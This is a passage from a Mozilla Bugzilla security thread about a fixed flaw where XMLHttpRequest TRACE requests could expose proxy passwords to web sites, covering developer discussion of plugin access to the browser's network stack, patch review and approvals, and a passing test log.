or it may share the keep-alive connections and proxy connections
with other browser-initiated request(\*1). This cannot be achieved by
plugin's own HTTP implementation. The reported problem does not arise
for any components which uses its own HTTP implementation, unless
users told the same secret explicitly to such components.
So, allowing its HTTP stack for other's use should be careful in general.
Having an interface which allows arbitrary requests to be sent is equivalent
to having an interface which allows every secret passwords to be read by them.
Having own "sanity check" before using own secret credential will be a good,
"more secure" idea.
(\*1) If Mozilla differentiate between internally/externally generated request
and do not perform such a thing for external requests, it is no problem.
I don't know about such internal issue.

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=302489#c3)• 19 years ago |
|  | |

You make a good point about re-using the same HTTP stack. It is indeed the case
that Mozilla does not differentiate external vs internal HTTP requests, so they
would all potentially be pipelined together, for example. But, plugins do
actually have access to Mozilla's password cache. There is an API for that
explicitly to allow the Java plugin to act like it is using Mozilla's HTTP stack
when in fact it is not.

|  | [Yutaka OIWA](/user_profile?user_id=209278)  Reporter |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=302489#c4)• 19 years ago |
|  | |

(In reply to [comment #3](/show_bug.cgi?id=302489#c3 "RESOLVED FIXED - XMLHTTP TRACE method can reveal proxy passwords to web sites"))
> But, plugins do
> actually have access to Mozilla's password cache. There is an API for that
> explicitly to allow the Java plugin to act like it is using Mozilla's HTTP stack
> when in fact it is not.
Oops... Is it a good design? I might become wanting to send a
featurewish bug report about changing this interface :-P
# Is there a API for getting cookies, too?
Anyway, this answers to my first concern, in very unexpected way :-)
Now this is not the issue for plugin (modulo cookies), I agree.
Fixing it at XMLHTTP layer will be fine.
# How about issues in [bug 302263](/show_bug.cgi?id=302263 "RESOLVED FIXED - XMLHttpRequest allows dangerous request headers to be set")? Does the problems regarding
# Content-length and Transfer-encoding reappear for plugins?
## Host might not be a problem in this case.

|  | [Christian :Biesinger (don't email me, ping me on IRC)](/user_profile?user_id=15661) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=302489#c5)• 19 years ago |
|  | |

there is an API for cookies too, yes. Additionally, plugins \_can\_ use mozilla's
networking stack if they so desire.

|  | [Yutaka OIWA](/user_profile?user_id=209278)  Reporter |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=302489#c6)• 19 years ago |
|  | |

(In reply to [comment #5](/show_bug.cgi?id=302489#c5 "RESOLVED FIXED - XMLHTTP TRACE method can reveal proxy passwords to web sites"))
> there is an API for cookies too, yes. Additionally, plugins \_can\_ use mozilla's
> networking stack if they so desire.
OK.
Self Addition to #4:
I feel that possible plugin-based request-splitting issue
(which I have written in #4) is less critical (at least) now.
(Because there are no known vulnerable plugins)
Please keep it aside now.
# Does someone know whether Macromedia flash has an ability to
# pass arbitrary-chosen HTTP headers to Mozilla?

|  | [Jesse Ruderman](/user_profile?user_id=11608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=302489#a25226_11608)• 19 years ago |

Whiteboard: [sg:fix]

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=302489#c7)• 19 years ago |
|  | |

Attached patch

[v1 patch](attachment.cgi?id=190884&action=diff)
— [Details](attachment.cgi?id=190884&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=302489&attachment=190884)

[Attachment #190884](/attachment.cgi?id=190884&action=edit "v1 patch") -
Flags: superreview?(dveditz)
[Attachment #190884](/attachment.cgi?id=190884&action=edit "v1 patch") -
Flags: review?(jst)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=302489#c8)• 19 years ago |
|  | |

The standard plugin API only supports Get and post. The plugin could make it's
own raw calls of course, but not using our networking engine.
We added scriptability to plugins, but that should be sandboxed to the
containing web page and again not allow raw access to the network engine.
Java has a special OJI interface with more stuff exposed, but applets shouldn't
have raw access to anything.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=302489#c9)• 19 years ago |
|  | |

Comment on [attachment 190884](/attachment.cgi?id=190884 "v1 patch") [[details]](/attachment.cgi?id=190884&action=edit "v1 patch") [[diff]](/attachment.cgi?id=190884&action=diff "v1 patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=302489&attachment=190884)
v1 patch
sr=dveditz
[Attachment #190884](/attachment.cgi?id=190884&action=edit "v1 patch") -
Flags: superreview?(dveditz)
[Attachment #190884](/attachment.cgi?id=190884&action=edit "v1 patch") -
Flags: superreview+
[Attachment #190884](/attachment.cgi?id=190884&action=edit "v1 patch") -
Flags: approval1.8b4?
[Attachment #190884](/attachment.cgi?id=190884&action=edit "v1 patch") -
Flags: approval1.7.12?
[Attachment #190884](/attachment.cgi?id=190884&action=edit "v1 patch") -
Flags: approval-aviary1.0.7?

|  | [Christian :Biesinger (don't email me, ping me on IRC)](/user_profile?user_id=15661) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=302489#c10)• 19 years ago |
|  | |

(In reply to [comment #8](/show_bug.cgi?id=302489#c8 "RESOLVED FIXED - XMLHTTP TRACE method can reveal proxy passwords to web sites"))
> The standard plugin API only supports Get and post. The plugin could make it's
> own raw calls of course, but not using our networking engine.
plugins can get the service manager
(<http://lxr.mozilla.org/seamonkey/source/modules/plugin/base/public/npapi.h#419>)
and from that the necko services. plugins can use mozilla's networking engine
just fine.

|  | [Asa Dotzler [:asa]](/user_profile?user_id=5003) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=302489#a62635_5003)• 19 years ago |

[Attachment #190884](/attachment.cgi?id=190884&action=edit "v1 patch") -
Flags: approval1.8b4? → approval1.8b4+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=302489#c11)• 19 years ago |
|  | |

(In reply to [comment #10](/show_bug.cgi?id=302489#c10 "RESOLVED FIXED - XMLHTTP TRACE method can reveal proxy passwords to web sites"))
> plugins can get the service manager [...] and from that the necko services.
> plugins can use mozilla's networking engine just fine.
True, but then they've stepped outside the NPAPI into functionality that won't
work on other browsers like Opera or Safari so there's a fair incentive not to
do that. And a plugin author would be insane if they passed that raw ability
through to the media content. If they allow content to send TRACE they've gone
out of their way to do so, it's their flaw.

|  | [Asa Dotzler [:asa]](/user_profile?user_id=5003) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=302489#a125303_5003)• 19 years ago |

Flags: blocking1.8b4? → blocking1.8b4+

|  | [Johnny Stenback (:jst)](/user_profile?user_id=12352) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=302489#c12)• 19 years ago |
|  | |

Comment on [attachment 190884](/attachment.cgi?id=190884 "v1 patch") [[details]](/attachment.cgi?id=190884&action=edit "v1 patch") [[diff]](/attachment.cgi?id=190884&action=diff "v1 patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=302489&attachment=190884)
v1 patch
r=jst
[Attachment #190884](/attachment.cgi?id=190884&action=edit "v1 patch") -
Flags: review?(jst) → review+

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=302489#c13)• 19 years ago |
|  | |

fixed-on-trunkStatus: ASSIGNED → RESOLVEDClosed: 19 years agoResolution: --- → FIXED

|  | [Jesse Ruderman](/user_profile?user_id=11608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=302489#a4180398_11608)• 19 years ago |

Flags: blocking-aviary1.0.8?

|  | [chris hofmann](/user_profile?user_id=2687) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=302489#c14)• 19 years ago |
|  | |

a bunch of test cases dumped into
[https://bugzilla.mozilla.org/show\_bug.cgi?id=297078](/show_bug.cgi?id=297078 "RESOLVED FIXED - setRequestHeader can be exploited using newline characters")

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=302489#a10697549_1689)• 19 years ago |

Flags: blocking1.7.13+Flags: blocking-aviary1.0.8?Flags: blocking-aviary1.0.8+

|  | [Bob Clary [:bc] (inactive)](/user_profile?user_id=23402) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=302489#a14910176_23402)• 19 years ago |

Flags: testcase+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=302489#c15)• 19 years ago |
|  | |

Comment on [attachment 190884](/attachment.cgi?id=190884 "v1 patch") [[details]](/attachment.cgi?id=190884&action=edit "v1 patch") [[diff]](/attachment.cgi?id=190884&action=diff "v1 patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=302489&attachment=190884)
v1 patch
a=dveditz for drivers, please add fixed-aviary1.0.8 and fixed1.7.13 keywords when checked in.
[Attachment #190884](/attachment.cgi?id=190884&action=edit "v1 patch") -
Flags: approval1.7.13?
[Attachment #190884](/attachment.cgi?id=190884&action=edit "v1 patch") -
Flags: approval1.7.13+
[Attachment #190884](/attachment.cgi?id=190884&action=edit "v1 patch") -
Flags: approval-aviary1.0.8?
[Attachment #190884](/attachment.cgi?id=190884&action=edit "v1 patch") -
Flags: approval-aviary1.0.8+

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=302489#c16)• 19 years ago |
|  | |

fixed-aviary1.0.8, fixed1.7.13Keywords: [fixed-aviary1.0.8](/buglist.cgi?keywords=fixed-aviary1.0.8&resolution=---),
[fixed1.7.13](/buglist.cgi?keywords=fixed1.7.13&resolution=---)

|  | [Bob Clary [:bc] (inactive)](/user_profile?user_id=23402) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=302489#c17)• 19 years ago |
|  | |

I did test this and it passed on ff 1.0.8 on all platforms.
example:
mfTest: [bug 302489](/show_bug.cgi?id=302489 "RESOLVED FIXED - XMLHTTP TRACE method can reveal proxy passwords to web sites"): Test [https://bugzilla.mozilla.org/show\_bug.cgi?id=302489](/show_bug.cgi?id=302489 "RESOLVED FIXED - XMLHTTP TRACE method can reveal proxy passwords to web sites"): XMLHTTP TRACE method can reveal proxy passwords to web sites Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060221 Firefox/1.5 Passed. (Pass: 1, Fail: 0)
mfTest: [bug 302489](/show_bug.cgi?id=302489 "RESOLVED FIXED - XMLHTTP TRACE method can reveal proxy passwords to web sites"): ASSERT: Passed : XMLHttpRequest prevented from sending TRACE requests
mfTest: [bug 302489](/show_bug.cgi?id=302489 "RESOLVED FIXED - XMLHTTP TRACE method can reveal proxy passwords to web sites"): INFORM: [Exception... "Component returned failure code: 0x80070057 (NS\_ERROR\_ILLEGAL\_VALUE) [nsIXMLHttpRequest.open]" nsresult: "0x80070057 (NS\_ERROR\_ILLEGAL\_VALUE)" location: "JS frame :: <http://test.mozilla.com/tests/mozilla.org/security/302489-01.html> :: test :: line 69" data: no]Keywords: [fixed-aviary1.0.8](/buglist.cgi?keywords=fixed-aviary1.0.8&resolution=---) → [verified-aviary1.0.8](/buglist.cgi?keywords=verified-aviary1.0.8&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=302489#a26798536_1689)• 19 years ago |

Group: security

|  | [Bob Clary [:bc] (inactive)](/user_profile?user_id=23402) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=302489#a52911942_23402)• 18 years ago |

Flags: in-testsuite+ → in-testsuite?
You need to [log in](/show_bug.cgi?id=302489&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Darin Fisher](/user_profile?user_id=20048)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review


